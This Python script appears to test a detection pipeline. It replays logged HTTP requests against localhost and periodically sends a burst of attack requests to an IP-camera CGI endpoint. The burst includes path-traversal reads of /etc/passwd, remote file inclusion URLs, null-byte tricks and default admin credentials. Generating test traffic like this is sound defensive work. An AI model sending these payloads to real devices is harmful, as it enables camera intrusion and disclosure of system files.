import pathlib
import sys
directory = pathlib.Path(__file__)
sys.path.append(directory.parent.parent.parent.__str__())

import os
import re
import requests
import pipeline
import threading
import time
import ZODB, ZODB.FileStorage, ZODB.DB
from datetime import datetime
import random

HTTP_RE = re.compile(r"--START--.+?Hour: .+?\s+(.+?)\s+--END--", re.MULTILINE | re.DOTALL)


def http_re(data):
    """
    Extracts HTTP requests from raw data string in special logging format.

    Logging format `ST@RT\n%(asctime)s %(levelname)-8s\n%(message)s\nEND`
    where `message` is a required HTTP request bytes.
    """

    return HTTP_RE.findall(data)


def get_requests_from_file(path):
    """
    Reads raw HTTP requests from given file.
    """
    with open(path, 'r') as f:
        file_data = f.read()
    requests = http_re(file_data)
    return requests


def _process_request(req):
    """
    Splits a request into lines and convert a string into ints.
    """
    my_method = ""
    my_uri = "http://127.0.0.1:80"
    dictRequest={}
    my_header = {}
    i = 0
    body = False
    for line in (req.strip()).splitlines():
        if line=="":
            body=True
        if i == 0 and len(line.split())>2:
            my_method=line.split()[0]
            my_uri = my_uri + line.split()[1]
        else:
            if not body and len(line.split(':'))>1:
                key = line.split(':')[0].lstrip()
                value = line.split(':')[1].lstrip()
                my_header[key]=value
            else:
                dictRequest['body']=line.split(':')[0]
        #print("-")
        i=i+1
    return my_method, my_uri, my_header, dictRequest


def simulate_moving_attack():
    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "*/*",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "http://146.136.47.202/web/mainpage.html",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive"
    }
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=infinity&-act=right&-speed=100", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?user=bob&authz_token=1234&expire=1500000000", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?-step=0&-act=stop&-speed=45", auth=("admin", "password"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=report.pdf", auth=("admin", "password"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=../../../../some dir/some file", auth=("admin", "password"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=/etc/passwd", auth=("admin", "password"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://other-site.com.br/other-page.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://google.com.br/index.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://other-site.com.br/other-page.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=http://google.com.br/index.htm/malicius-code.php", auth=("admin", "password"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?file=main.cgi", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=list", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=2", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=test", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/get.php", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/admin/get.inc", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/etc/passwd", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/var/www/html/get.php", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/../.../.../admin/etc.inc", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?f=/../passwd", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?home=ptzctrl.cgi", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=../scripts/foo.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/hi3510/ptzctrl.cgi?page=../scripts/ptzctrl.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/..%u2216..%u2216someother/ptzctrl.cgi?page=../scripts/ptzctrl.cgi%00txt", auth=("admin", "admin"), headers=my_headers)
    requests.get(url="http://127.0.0.1:80/web/cgi-bin/../../../../../etc/passwd", auth=("admin", "admin"), headers=my_headers)


def send_data(p: pipeline.Pipeline):
    time.sleep(5)

    script_dir = os.path.dirname(__file__)  # <-- absolute dir the script is in
    rel_path = "scans.txt"
    path_data = os.path.join(script_dir, rel_path)

    http_requests = get_requests_from_file(path_data)
    #print(f"# of requests: {str(len(http_requests))}")

    my_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    }

    try:
        print("Start sending requests")
        i = 1
        j = 0
        for req in http_requests:
            my_method, my_uri, my_header, dictRequest = _process_request(req)
            if my_method == 'GET':
                print(f"Request {i}")
                requests.get(url=my_uri, headers=my_header)
                i = i + 1
                j += 1
            elif my_method == 'POST':
                print(f"Request {i}")
                if not 'body' in dictRequest:
                    dictRequest['body'] = ''
                    my_header['Content-Length'] = '0'
                requests.post(url=my_uri, headers=my_header, data=dictRequest['body'])
                i = i + 1
                j += 1
            elif my_method == 'PUT':
                print(f"Request {i}")
                if not 'body' in dictRequest:
                    dictRequest['body'] = ''
                    my_header['Content-Length'] = '0'
                requests.put(url=my_uri, headers=my_header, data=dictRequest['body'])
                i = i + 1
                j += 1

            if i % 300 == 0:
                simulate_moving_attack()
                j += 25

            if i % 100 == 0:
                my_headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
                    "Accept": "*/*",
                    "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
                    "Accept-Encoding": "gzip, deflate",
                    "Referer": "http://146.136.47.202/web/mainpage.html",
                    "X-Requested-With": "XMLHttpRequest",
                    "Connection": "keep-alive"
                }
                requests.get(url="http://127.0.0.1:80/web?name=admin%253Aadmin", auth=("admin", "admin"), headers=my_headers)
                j += 1
    
    except Exception as e:
        print(f"UNEXPECTED ERROR: {e}")    
    finally:
        print("Finally")
        print(f"Sent Requests: {j}")
        os._exit(0)


if __name__ == '__main__':
    p = pipeline.Pipeline("", "test", True)
    t = threading.Thread(target=p.init_pipeline).start()
    send_data(p)
